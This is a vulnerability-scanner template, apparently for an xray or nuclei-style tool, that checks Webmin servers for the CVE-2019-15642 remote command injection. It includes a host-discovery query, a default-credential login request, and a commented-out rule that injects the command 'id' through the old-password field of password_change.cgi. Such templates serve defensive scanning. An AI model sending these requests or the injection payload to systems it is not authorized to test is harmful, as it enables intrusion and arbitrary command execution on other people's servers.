id: CVE-2019-15642

info:
  name: Webmin<=1.9.20 远程代码执行
  author: daffainfo
  severity: critical
  description: Webmin的是一个用于管理类Unix的系统的管理配置工具，具有网络页面。在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。它已知在端口10000上运行。在重置密码功能中发现了一个错误，该错误允许恶意第三方由于缺少输入验证而执行恶意代码。
  reference:
    - https://mp.weixin.qq.com/s/bTQOjOAP7xqNX8KfrLWdLw
  metadata:
    fofa-query: fid="msMQZIdASsAWP2cTH1/Pow=="

set:
  hosturl: request.url
rules:
  r0:
    request:
      method: POST
      path: /session_login.cgi
      headers:
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Origin: "{{hosturl}}"
        Referer: "{{hosturl}}"
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Te: trailers
      body: |
        user=root&pass=root
    expression: response.status == 200
#  r1:
#    request:
#      method: POST
#      path: /password_change.cgi
#      headers:
#        Referer: "{{hosturl}}"
#        Cookie: redirect=1; testing=1; sid=62f00980984f9fed437c0b4434cd5ab7
#      body: |
#        user=root111&pam=&expired=2&old=test|id&new1=test2&new2=test2
#    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
expression: r0()